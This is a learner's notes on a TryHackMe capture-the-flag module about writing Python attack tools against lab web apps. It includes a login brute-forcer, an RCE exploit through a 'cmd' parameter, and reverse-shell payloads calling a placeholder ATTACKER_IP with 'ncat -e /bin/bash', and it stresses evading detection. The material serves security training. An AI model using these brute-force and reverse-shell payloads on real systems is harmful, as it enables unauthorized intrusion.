# Day 28: Custom Tooling Using Python — TryHackMe Module Notes

> **Module:** Custom Tooling Using Python  
> **Difficulty:** Easy  
> **Platform:** TryHackMe  

---

## What I Learned

This module covered how to build custom security tools and exploits using Python for web application penetration testing. Rather than relying on off-the-shelf tools (which are often already signatured and detectable), writing your own tooling gives you full control, stealth, and flexibility.

---

## 1. Why Build Custom Tools?

- Tailor functionality to a specific engagement
- Automate repetitive tasks (brute-forcing, scanning, exploitation)
- Bypass detection — custom tools haven't been signatured yet
- Modify existing exploits to fit exact needs

---

## 2. Scripting vs. Compiled Languages

| | Scripting (Python, JS) | Compiled (Go, .NET) |
|---|---|---|
| Speed | Slower | Faster |
| Dev speed | Fast prototyping | Slower to write |
| Stealth | Lower | Higher |
| Portability | High (interpreter needed) | High (standalone binary) |

**Python** is the most popular choice for security tooling because of its fast development cycle, massive library ecosystem, and cross-platform support.

---

## 3. Brute-Forcing Tool

Built a Python script to automate login brute-forcing against a web app.

**Key concepts:**
- Used the `requests` library to send HTTP POST requests
- Generated password lists programmatically using `zfill()` and `string` module ranges
- Detected successful login by checking if the response **did not** contain the word `"Invalid"`

**Example — numeric 4-digit passwords for `admin`:**
```python
import requests

url = "http://python.thm/labs/lab1/index.php"
password_list = [str(i).zfill(4) for i in range(10000)]

for password in password_list:
    response = requests.post(url, data={"username": "admin", "password": password})
    if "Invalid" not in response.text:
        print(f"[+] Found: admin:{password}")
        break
```

**Extended — alphanumeric pattern passwords for `mark` (3 digits + 1 uppercase letter):**
```python
password_list = [f"{str(i).zfill(3)}{chr(j)}" for i in range(1000) for j in range(65, 91)]
```

**Flags captured:**
- `THM{Brute_Force_Success007}` (admin)
- `THM{Brute_Force_Success_Mark001}` (mark)

---

## 4. Vulnerability Scanner

Built a scanner to detect **SQL Injection** and **XSS** vulnerabilities by injecting payloads and inspecting responses.

**Key concepts:**
- Used `re` (regex) to match error patterns in responses (e.g., `"SQL syntax error"`, `"Unknown column"`)
- Used `threading.Thread` to send multiple payloads simultaneously — much faster than sequential requests
- XSS detected by checking if the injected payload was **reflected** in the response unescaped

**Takeaway:** The `name` GET parameter on `departments.php` was vulnerable to **SQL injection** (2 payloads flagged). The scanner found 0 results when pointed at the wrong parameter, showing why understanding the target's parameters matters.

---

## 5. Basic RCE Exploit

Exploited a vulnerable endpoint that passed user input directly to the system shell:

```
http://python.thm/labs/lab3/execute.php?cmd=<command>
```

**Progression:**
1. Manually confirmed RCE via browser (`?cmd=ls`, `?cmd=cat flag.txt`)
2. Built an **interactive shell script** — loop that sends commands and prints output
3. Launched a **reverse shell** using `ncat`:

```python
payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
requests.get(url, params={"cmd": payload})
```

Set up a listener with `nc -lvnp 4444` to catch the connection.

**Flag:** `THM{basic_exploit_using_python}`

---

## 6. Task Automation — Full Chain Exploit

Combined everything into a single automated exploit script covering:

1. **Authentication** — logs in and stores the session cookie automatically using `requests.Session()`
2. **Command injection** — sends commands via a POST parameter on the dashboard
3. **Session handling** — detects expired sessions and re-authenticates
4. **Reverse shell** — sends an `ncat` payload to get persistent shell access

```python
session = requests.Session()
session.post(LOGIN_URL, data={"username": "admin", "password": "password123"})
session.post(EXECUTE_URL, data={"cmd": "ncat ATTACKER_IP 4444 -e /bin/bash"})
```

`requests.Session()` is the key here — it handles cookies automatically across all requests, making authenticated automation seamless.

**Flag:** `THM{6470e394cbf6dab6a91682cc8585059b}`

---

## Key Libraries Used

| Library | Purpose |
|---|---|
| `requests` | HTTP requests, session management |
| `threading` | Concurrent requests for faster scanning |
| `re` | Regex pattern matching on responses |
| `string` | Character/digit generation for wordlists |

---

## Key Takeaways

- Python is fast to write, easy to iterate on, and has everything needed for web pentesting out of the box
- Custom tools avoid detection because they haven't been signatured
- A complete exploit chain goes: **recon → auth bypass → command execution → reverse shell**
- `requests.Session()` is essential for maintaining authenticated state across an exploit
- Multi-threading dramatically speeds up scanning and brute-forcing
- Always verify scanner findings manually to rule out false positives